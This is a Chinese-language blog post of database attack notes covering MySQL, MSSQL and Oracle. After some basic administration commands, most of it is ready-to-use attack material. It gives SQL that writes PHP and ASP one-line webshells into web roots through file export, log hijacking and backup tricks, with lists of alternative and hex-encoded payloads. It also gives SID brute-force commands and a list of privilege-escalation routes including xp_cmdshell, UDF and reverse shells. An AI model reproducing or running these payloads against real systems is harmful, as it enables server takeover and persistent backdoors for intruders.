---
layout:     post
title:      常用数据库相关
date:       2020-05-26
author:     lceCr4m
header-img: img/21.jpg
catalog: true
tags:
    - 数据库
---
> 本文是关于数据库相关内容：MySQL，MsSQL，Oracle，~~Access~~。MySQL和mssql我都用过，mssql还做过项目，不过Oracle和access没怎么接触过，access可能不会写，Oracle还是要写的。

# 0x00 前言
本文是关于数据库相关内容，之后我还会写一个关于bypass或者waf的文章。最近许多课结课了，在准备考试中，所以文章写的比较少。在七月的话，是准备写代码的文章，所以在最后这一个月，要把web，数据库，bypass相关写完。
# 0x01 MySQL
## Ⅰ 常用命令
远程连接：

```
mysql -h 192.168.0.1 -u root -p
```
远程连接报错：Host is not allowed to connect to this MySQL server。解决：

```
在装有MySQL的机器上登录MySQL：mysql -u root -p
mysql>use mysql;
mysql>update user set host = '%' where user = 'root';//这一句执行完可能会报错，不用管它。
mysql>FLUSH PRIVILEGES;
```
用户及权限相关：

```
SELECT user,host FROM mysql.user;
SELECT * FROM mysql.user WHERE user='root'\G
CREATE USER 'username'@'host' IDENTIFIED BY 'password'
GRANT privileges ON databasename.tablename TO 'username'@'host' [WITH GRANT OPTION];
REVOKE privilege ON databasename.tablename FROM 'username'@'host';
SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
DROP USER 'username'@'host';
```

其他常用命令~~学数据库理论都学过了~~：

```
select version();
select load_file('xxx');
show databases;
use 数据库名;
show tables;
desc 表名;
select * from 表名;
drop database 数据库名;
drop table 表名;
```

## Ⅱ 信息与密码
MySQL默认端口为3306，可以直接nmap扫某一网段的3306端口。
其他工具比如msf的辅助模块，还有sqlmap找注入点。如果有像phpmyadmin这种MySQL管理工具就更方便了。

已知存在MySQL密码方面的话就暴力破解，hydra，bp等。
## Ⅲ Getshell
getshell的话需要有注入点或者拿到诸如phpmyadmin后台管理的密码。  
直接导出一句话后门：

```
select '<?php @eval($_POST[hack]);?>'INTO OUTFILE 'D:/phpstudy_pro/WWW/hack.php'
```
创建数据库导出一句话后门：

```
CREATE TABLE `mysql`.`hack` (`temp` TEXT NOTNULL );
INSERT INTO `mysql`.`hack` (`temp` ) VALUES('<?php @eval($_POST[hack]);?>');
SELECT `temp` FROM `hack` INTO OUTFILE'D:/phpstudy_pro/WWW/hack.php';
DROP TABLE IF EXISTS `hack`;
```

cmd命令：

```
select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'D:/phpstudy_pro/WWW/hack.php'
```
加密：

```
select unhex('十六进制字符串') into dumpfile 'D:/phpstudy_pro/WWW/hack.php'
```
上述导出文件的方法需要secure_file_priv为ON。可通过show variables like 'secure_file_priv';查看，通过在my.ini中添加secure_file_priv=''，可以开启导入导出功能。

日志getshell：

```
show global variables like "%genera%";
set global general_log='on';
set global general_log_file='D:/phpstudy_pro/WWW/hack.php';
select '<?php assert($_POST["hack"]);?>';
set global general_log_file = '原本日志文件路径';
set global general_log=off;
```
如果是url注入点，可以直接通过sqlmap实现注入。其他手工注入方式如union，报错等不再赘述。
## Ⅳ MySQL提权
网上流传的MySQL提权分为三类：  
1. UDF（用户自定义函数）提权（低版本mysql）
1. MOF提权（低版本windows）
1. 启动项提权

说明：  
1. udf提权需要拿到webshell，操作主要是把恶意dll放到MySQL/lib/plugin/udf.dll目录下。要说的是，反弹端口连接提权也是udf提权的一种。
1. mof提权也需要webshell，要把恶意mof文件放到c:/windows/system32/wbem/mof/AddUser.mof目录下，自动运行后会添加恶意用户。
1. 启动项提权需要外联的shell，主要是将VBS写入表里，然后导入启动项。

工具：
- https://github.com/T3st0r-Git/HackMySQL  
- mysql脚本等附件

# 0x02 MsSql
## Ⅰ Getshell
差异备份：
```
dbo和sa权限都有备份数据库权限，我们通过差异备份，生成恶意asp文件，之后可以获得shell。
操作：
IF EXISTS(select table_name from information_schema.tables where table_name='dtest') drop table dtest;  //查看要创建的临时表是否被占用
backup database 库名 to disk = "目标文件路径.bak";
create table [dbo].[dtest] ([cmd] [image]);
insert into dtest(cmd) 
values(0x3C25657865637574652872657175657374282261222929253E);  //<%execute(request("a"))%>
backup 
database 库名 to disk='目标位置\hack.asp' WITH DIFFERENTIAL,FORMAT;
```
log备份：

```
log备份生成小马文件小，成功率大，拿到db权限后可以尝试。
操作：
IF EXISTS(select table_name from information_schema.tables where table_name='temp') drop table temp;
alter database 数据库名称 set RECOVERY FULL;
create table temp (a image);
backup log db_name to disk = '任意绝对路径.bak' with init;
insert into temp (a) values (<%%25Execute(request("hack"))%%25>);
backup log db_name to disk = '绝对路径.asp';

other_values:
- <%%25Execute(request("hack"))%%25> 
- <%Execute(request("hack"))%> 
- %><%execute request("hack")%><% 
- <script language=VBScript runat=server>execute request("hack")</Script> 
- <%25Execute(request("hack"))%25> 
- 0x3C25657865637574652872657175657374282261222929253E
```
sp_makewebtask写文件：

```
sa权限，SQL Server2008不可用，SQL Server2000可用
操作：
exec sp_configure 'show advanced options',1;
RECONFIGURE;
exec sp_configure 'Web Assistant Procedures',1;
RECONFIGURE;
exec sp_makewebtask 'C:\hack.php','select"<%execute(request("hack"))%>"';
```
另外xp_cmdshell和OLE（sp_oacreate/sp_oamethod）相关既可以用来提权也可以用来写文件，不再赘述。
## Ⅱ mssql提权
常见方式：
-   xp_cmdshell  //执行系统层面的命令
- 	OLE->sp_oacreate/sp_oamethod  //执行系统层面的命令
- 	沙盒模式 + xp_regwrite/xp_reread + openrowset  //读写注册表
- 	注册表映像劫持
- 	wscript.shell
- 	Shell.Application
- 	agent job
- 	public
- 	证书提权

工具：
- https://github.com/NetSPI/PowerUpSQL

# 0x03 Oracle
## Ⅰ 信息搜集
SID：连接oracle数据库不仅需要账号密码，而且还需要SID（SID是一个数据库的唯一标识符！是建立一个数据库时系统自动赋予的一个初始ID）。  
获取：  
1.使用msf

```
msf > use auxiliary/scanner/oracle/sid_enummsf 
msf > use auxiliary/admin/oracle/sid_brute
```
2.使用sidguess，是kali下的一款爆破Oracle SID的工具
```
sidguess -i <target IP> -d /home/myh0st/pass.txt
```
3.针对自带web管理平台。如果oracle的版本为10g，默认自带通过8080端口远程管理的可以访问以下路径：
```
http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
```
常用命令：
```
#查询数据库版本：
select * from v$version;
#数据库打补丁情况:
select * from dba_registry_history;
#查看所有用户:
select * from all_users;
#查询数据库中的所有表:
select owner,table_name from all_tables;
#当前用户被激活的角色:
select * from session_roles;
#描述数据库对象:
desc utl_http
```
## Ⅱ oracle提权
oracle提权漏洞集中存在于PL/SQL编写的函数、存储过程、包、触发器中。oracle存在提权漏洞的一个重要原因是PL/SQL定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。  
Java具有一组非常强大的标准库，oracle数据库支持使用Java来编写存储过程，那么攻击者就可以通过这一特性，在系统上执行Java代码，从而完成提权操作。

系统权限分类：  
- DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。  
- RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。  
- CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。

对于普通用户：授予connect, resource权限。  
对于DBA管理用户：授予connect，resource, dba权限。  

提权：
- DBMS_EXPORT_EXTENSION()扩展包内get_domain_index_tables函数存在注入漏洞执行命令
- dbms_xmlquery.newcontext()/dbms_xmlquery.getxml()函数执行命令  //需要DBMS_EXPORT_EXTENSION存在漏洞
- DBMS_JAVA_TEST.FUNCALL()执行命令
- create procedure权限，存储过程执行命令
- 反弹shell  //在提权操作中如果遇到无回显情况，可以通过反弹shell的方式








